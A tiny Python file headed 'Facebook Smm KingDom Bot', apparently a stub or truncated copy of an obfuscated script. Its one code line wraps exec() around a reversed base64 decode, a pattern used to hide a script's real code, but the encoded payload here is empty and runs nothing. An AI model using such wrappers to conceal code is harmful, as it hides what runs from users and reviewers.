# Fares Alex
# Facebook Smm KingDom Bot
# Time: Fri Aug 22 15:14:21 2025
# ----------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=='))
